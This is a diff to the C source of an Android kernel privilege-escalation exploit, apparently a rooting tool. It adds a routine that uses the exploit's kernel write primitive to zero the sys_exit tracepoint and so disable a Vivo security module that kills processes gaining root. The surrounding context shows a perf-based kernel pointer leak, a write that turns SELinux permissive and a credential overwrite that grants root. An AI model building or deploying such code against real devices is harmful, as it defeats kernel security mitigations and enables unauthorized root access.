@@ -912,6 +912,50 @@ static pid_t spawn_child(struct child_pipes *p) {
 }
 
 /* Fork the victim and read back the task pointer perf leaked. */
+/*
+ * neutralize_vr_global() — disable vr.ko's sys_exit enforcement probe.
+ *
+ * Vivo devices ship vr.ko which registers an enforcement kprobe (func1)
+ * on __tracepoint_sys_exit. When any process commits uid=0 credentials,
+ * vr's commit_creds probe (func2) sets per-task tags. func1 then kills
+ * the tagged process on the next sys_exit. This makes ksud and all shells
+ * it spawns die immediately after getting root.
+ *
+ * Fix: zero __tracepoint_sys_exit.funcs (at tp+TRACEPOINT_FUNCS_OFF=0x40).
+ * The standard kernel tracepoint iterator checks for NULL funcs before
+ * calling probes — safe to zero, no kernel panic. The commit_creds probe
+ * (func2) still runs and sets tags, but func1 never fires to act on them.
+ *
+ * Gated on:
+ *   - vr.ko detected in /proc/modules (vr_loaded)
+ *   - active_offsets->off_vr_sys_exit_tp != 0 (non-vivo kernels untouched)
+ *
+ * Called once after W1 (SELinux permissive), before spawn_victim.
+ * 5 retries because do_one_write is probabilistic.
+ */
+static int neutralize_vr_global(void) {
+  if (!active_offsets || !active_offsets->off_vr_sys_exit_tp) {
+    pr_info("vr global: off_vr_sys_exit_tp not set; skipping\n");
+    return 0;
+  }
+  uintptr_t tp_funcs_addr =
+      data_addr(KIMAGE_TEXT_BASE + active_offsets->off_vr_sys_exit_tp)
+      + TRACEPOINT_FUNCS_OFF;
+  pr_info("vr global: zeroing sys_exit tp->funcs @ %016zx\n", tp_funcs_addr);
+  for (int attempt = 1; attempt <= 5; attempt++) {
+    int ok = do_one_write(tp_funcs_addr,
+                          "VR-global: sys_exit tp->funcs", 1, 1);
+    if (ok) {
+      pr_success("vr.ko sys_exit probe killed (attempt %d)\n", attempt);
+      return 1;
+    }
+    pr_warning("vr global: attempt %d failed, retrying\n", attempt);
+    usleep(50000);
+  }
+  pr_warning("vr global: all 5 attempts failed; KSU shells may be killed\n");
+  return 0;
+}
+
 static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
   pid_t child = spawn_child(p);
   if (child < 0) return -1;
@@ -1069,6 +1113,32 @@ int run_exploit(int argc, char **argv) {
     TIMER("Write 1 complete");
   } else {
     pr_success("SELinux already permissive\n");
+  }
+
+  /* Vivo vr.ko: globally disable the sys_exit enforcement probe now that
+   * SELinux is permissive. Must happen before spawn_victim so ksud and
+   * any shells it spawns are not killed after W2 grants root. Only runs
+   * when off_vr_sys_exit_tp is set (vivo-specific kernel offsets). */
+  {
+    int vr_loaded = 0;
+    FILE *mf = fopen("/proc/modules", "r");
+    if (!mf) {
+      /* /proc/modules unreadable under some SELinux configs; if the
+       * per-kernel offsets have off_vr_sys_exit_tp set, assume loaded. */
+      if (active_offsets && active_offsets->off_vr_sys_exit_tp)
+        vr_loaded = 1;
+    } else {
+      char mod[256];
+      while (fgets(mod, sizeof(mod), mf)) {
+        if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_')) {
+          vr_loaded = 1;
+          break;
+        }
+      }
+      fclose(mf);
+    }
+    if (vr_loaded)
+      neutralize_vr_global();
   }
 
   /* W2: overwrite the child credential via the task leaked by perf. */
